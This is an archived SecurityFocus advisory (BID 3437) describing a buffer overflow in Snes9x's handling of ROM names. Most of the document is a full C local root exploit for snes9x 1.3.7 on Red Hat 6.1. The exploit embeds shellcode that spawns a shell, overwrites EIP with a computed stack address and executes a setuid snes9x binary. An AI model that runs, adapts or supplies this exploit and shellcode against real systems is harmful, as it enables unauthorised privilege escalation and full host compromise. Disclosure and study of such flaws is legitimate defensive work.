source: http://www.securityfocus.com/bid/3437/info

Snes9x is a free Super Nintendo emulator that runs on a number of platforms.

Snes9x is prone to a buffer overflow. This is due to improper bounds checking of rom names. In this case, 4089 characters are required to overwrite the EIP. If this buffer is overrun, it may be possible for a local attacker to execute arbitrary code on the host. This may be a security concern on some systems because Snes9x documentation suggests setting the utilities setuid root.

Successful exploitation will lead to a full compromise of the host.

It should be noted that packages distributed in SuSE Linux, NetBSD, OpenBSD, FreeBSD, Debian Linux and Progeny Linux are not installed setuid root by default so exploitation of the buffer overflow will not lead to a root compromise on these systems.

/*
 * snes9x local root exploit
 *
 * Tested on snes9x 1.3.7 + Redhat Linux 6.1
 * 2001/10/16 Creation morinosato
 */

#include <stdio.h>
#include <stdlib.h>

#define BUFSIZE 4089

char shellcode[]=
"\xeb\x29\x5e\x29\xc9\x89\xf3\x89\x5e\x08"
"\xb1\x07\x80\x03\x20\x43\xe0\xfa\x29\xc0"
"\x88\x46\x07\x89\x46\x0c\xb0\x0b\x87\xf3"
"\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0"
"\x40\xcd\x80\xe8\xd2\xff\xff\xff\x0f\x42"
"\x49\x4e\x0f\x53\x48";

main(int argc, char **argv)
{
	char buf[BUFSIZE + 1];
	char writeaddr[8];
	char *arg[] = {"./snes9x",buf,0};
	int i;
	unsigned int addr;

	addr = (0xc0000000 - 4)
		 - (sizeof("./snes9x"))
		 - (sizeof(buf));

	*(unsigned int *)&writeaddr[0] = addr;
	memset(buf, 'A', BUFSIZE);

	for (i = 0; i < strlen(shellcode); i++)
		buf[i] = shellcode[i];

	buf[83] = writeaddr[0];
	buf[84] = writeaddr[1];
	buf[85] = writeaddr[2];
	buf[86] = writeaddr[3];

	buf[BUFSIZE] = 0;

	printf("jmp to [0x%08x]\n",writeaddr);
	execve(arg[0], arg, 0);
}
